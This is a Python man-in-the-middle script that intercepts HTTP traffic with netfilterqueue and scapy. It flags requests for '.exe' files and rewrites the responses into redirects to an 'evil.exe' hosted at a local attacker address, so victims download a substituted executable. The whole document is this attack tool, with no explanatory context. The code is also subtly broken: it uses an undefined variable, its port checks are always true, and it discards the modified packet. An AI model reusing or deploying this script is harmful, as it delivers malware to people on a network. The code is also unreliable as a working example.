#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list=[]

def set_load(packet,load):
    packet[scapy.Raw].load=load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return  packet
def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80 or 1000:
            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.101.130" not in scapy_packet[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80 or 1000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet=set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.101.130/exe/evil.exe\n\n")
                packet.set_payload(str(scapy_packet))
    packet.accept()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()